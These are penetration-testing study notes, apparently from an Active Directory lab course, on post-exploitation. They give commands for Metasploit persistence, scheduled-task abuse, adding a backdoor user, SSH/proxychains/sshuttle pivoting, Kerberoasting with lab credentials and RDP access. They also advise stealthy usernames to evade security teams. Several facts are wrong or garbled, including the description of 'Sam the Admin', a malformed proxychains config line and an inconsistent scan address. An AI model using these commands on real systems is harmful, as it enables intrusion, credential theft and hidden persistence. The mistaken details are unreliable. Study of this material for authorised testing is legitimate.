## üõ†Ô∏è Post Exploitation

### üìù Summary

**Post-exploitation** focuses on maintaining control of a compromised system, pivoting to access other network segments, and identifying critical vulnerabilities. It includes techniques like adding persistent users, using scheduled tasks, and employing tools like **proxychains** and **sshuttle** to pivot through different networks. Always remember, exploiting known vulnerabilities like **ZeroLogon** and **PrintNightmare** requires explicit client approval.

### üìã Detailed Notes

### 1. **Active Directory Vulnerabilities Overview** üõ°Ô∏è

- **Active Directory (AD)** is often vulnerable to several exploits. Some notable examples:
    - **ZeroLogon**: Allows an attacker to take over a domain controller using the Netlogon protocol.
    - **PrintNightmare**: Exploits the Windows Print Spooler to perform remote code execution.
    - **Sam the Admin**: A vulnerability in Windows registry permissions that allows attackers to extract **SAM** (Security Account Manager) files.
- **‚ö†Ô∏è Important:** Check for these vulnerabilities during assessments, but **only exploit them** with **client approval**.

### 2. **Maintaining Access Overview** üîí

**Persistence** is critical to maintain control over a compromised system. Here are several methods to achieve persistence:

### **1. Using Persistence Scripts:**

- **Metasploit Modules** provide automated ways to establish persistent access:
    - To view available options:
        
        ```bash
        run persistence -h
        
        ```
        
    - Common persistence modules:
        - `exploit/windows/local/persistence`
        - `exploit/windows/local/registry_persistence`

### **2. Scheduled Tasks:**

- Use scheduled tasks to maintain access:
    
    ```bash
    run scheduleme
    run schtaskabuse
    
    ```
    
    - **üí° Tip:** Scheduled tasks allow the attacker to execute commands or scripts at specified intervals.

### **3. Adding a User:**

- Create a new user to retain access:
    
    ```bash
    net user hacker password123 /add
    
    ```
    
- **üö® Critical Note:** If you create a new user, consider using stealthy usernames to avoid detection.

### 3. **Pivoting Overview** üîÑ

- **Pivoting** allows attackers to move from one compromised system to another, exploring additional network segments.
- Example Scenario: Accessing an **Ubuntu Linux machine** with the IP addresses **10.10.155.5** (direct access) and **10.10.10.5/24** (target network). To reach **10.10.10.5**, a pivot is required.

### **Step-by-Step Pivoting Guide:**

**1. Identify the Network Route:**

- Check available IP addresses on the compromised machine:
    
    ```bash
    ip a
    
    ```
    
- If you cannot directly ping the target network:
    
    ```bash
    ping 10.10.10.5
    
    ```
    
    - You need to set up a route to pivot into the network.

**2. Find Proxychains Port Configuration:**

- Check the configuration file to find the port number for **proxychains**:
    
    ```bash
    cat /etc/proxychains4.conf
    
    ```
    
    - Look for the line: `socks4 127.0.0.1 [port] 9050`.

**3. Establish an SSH Tunnel:**

- Set up an SSH tunnel that allows you to pivot into the target network:
    
    ```bash
    ssh -f -N -D [port] -i pivot root@10.10.155.5
    
    ```
    
    - **Explanation:** This command sets up a background tunnel that routes traffic through the compromised machine.

**4. Use Proxychains for Scanning and Attacks:**

- Open a new terminal tab and run a **proxychains Nmap** scan:
    
    ```bash
    proxychains nmap -p88 10.10.10.255
    
    ```
    
    - **üí° Tip:** If the scan fails, add the `sT` flag to perform a full TCP connect scan.
- Perform a **Kerberoasting Attack**:
    
    ```bash
    proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.225 -request
    
    ```
    
    - This command requests Kerberos tickets, which can be cracked offline to reveal plaintext passwords.
- **Accessing Machines via RDP (Remote Desktop Protocol):**
    
    ```bash
    proxychains xfreerdp /u:administrator /p:'Hacker321' /v:10.10.10.225
    
    ```
    
    - This allows you to remotely access the target machine using RDP through the proxy.
- **Access Other Services:**
    - Use **Firefox** through the proxy:
        
        ```bash
        proxychains firefox
        
        ```
        

**5. Pivoting with `sshuttle`:**

- Use `sshuttle` to access an entire network through an SSH tunnel:
    
    ```bash
    sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"
    
    ```
    
    - **üí° Ignore errors** from this command; it is normal during setup.
- **Now, perform Nmap scans** on the new network:
    
    ```bash
    nmap 10.10.10.225 -p88
    
    ```
    
    - With `sshuttle`, you can communicate directly with the target network.

### üìñ Abbreviations & Definitions

- **ZeroLogon**: A vulnerability that allows an attacker to gain control of a domain controller through the Netlogon protocol.
- **PrintNightmare**: A remote code execution vulnerability in the Windows Print Spooler service.
- **Persistence**: Techniques used by attackers to maintain access to a compromised system.
- **Proxychains**: A tool that routes network connections through proxy servers, used for pivoting into different network segments.
- **Pivoting**: Using a compromised system to access and explore other network segments.
- **Kerberoasting**: An attack that extracts Kerberos service tickets for offline cracking to reveal plaintext passwords.
- **sshuttle**: A tool that creates an encrypted SSH tunnel to route traffic between networks.

### üö® Critical Mentions & Exam Traps

- **üö® Permission is Crucial:** Always obtain **explicit client approval** before exploiting vulnerabilities like **ZeroLogon** or **PrintNightmare**.
- **üí° Use `sT` Flag with Nmap:** If a `proxychains nmap` scan is unsuccessful, adding the `sT` flag can help perform a more reliable scan.
- **üîë Add Users with Stealth:** When adding a user for persistence, use inconspicuous usernames to avoid detection by security teams.
- **‚ö†Ô∏è Proxychains Configuration:** Always verify the **proxychains4.conf** file for the correct port to avoid tunneling issues.
- **üîÑ Pivoting Tactics:** Remember that `sshuttle` and `proxychains` are both effective tools for pivoting. Choose the appropriate one based on the scenario.

---